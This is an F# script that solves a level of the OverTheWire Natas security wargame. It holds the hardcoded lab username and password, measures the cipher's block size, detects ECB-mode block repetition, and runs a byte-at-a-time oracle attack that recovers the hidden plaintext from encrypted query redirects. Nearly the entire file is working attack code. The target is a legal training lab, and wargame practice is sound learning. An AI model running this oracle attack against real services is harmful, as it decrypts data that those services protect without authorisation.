open System
open System.Net
open System.Web

let url = "http://natas28.natas.labs.overthewire.org/"
let credentials = "natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let hex (bytes: seq<byte>) =
    bytes
    |> Seq.map (fun b -> Convert.ToString(b, 16).PadLeft(2, '0'))
    |> String.concat ""

let b64tohex s =
    Convert.FromBase64String(s) |> hex

let hexFor query =
    let url = sprintf "%s?query=%s" url query
    let http = HttpWebRequest.CreateHttp url
    http.Headers.Add(basicAuth)
    http.Method <- "HEAD"
    http.AllowAutoRedirect <- false

    let response =
        try
            http.GetResponse ()
        with | :? WebException as webEx ->
            webEx.Response
    let newUrl = response.Headers.["Location"]
    let query = HttpUtility.UrlDecode(newUrl.Substring(newUrl.IndexOf("query=") + 6))
    b64tohex query

let blockSize = 
    let baseSize = hexFor ""
    let atSize8 = hexFor "AAAAAAAA"
    if atSize8.Length > baseSize.Length then 8
    else
        let atSize16 = hexFor "AAAAAAAAAAAAAAAA"
        if atSize16.Length > baseSize.Length then 16
        else failwith "something is wrong"

let chunked (hex: string) =
    Seq.chunkBySize (blockSize * 2) hex
    |> Seq.map (fun ca -> String(ca))
    |> Seq.toArray

let fullSize, doubleChunkIndex = 
    [16..48] 
    |> List.pick (fun n ->
        let query = String.replicate n "A"
        let chunks = hexFor query |> chunked
        if Set.count (Set.ofArray chunks) = chunks.Length then None
        else
            let index = [1..chunks.Length - 1] |> List.find (fun i -> chunks.[i] = chunks.[i - 1])
            Some (n, index))

let rec exploiter (soFar: string) =
    let n = fullSize - soFar.Length - 1
    let query = String.replicate n "A" + soFar
    let orig = hexFor query
    let nextChar =
        [0..127]
        |> List.map (char >> string)
        |> List.find (fun c -> 
            let query = query + c
            let enc = hexFor query
            orig = enc)
    let nextSoFar = soFar + nextChar
    if nextSoFar.Length = fullSize then soFar
    else exploiter nextSoFar

exploiter ""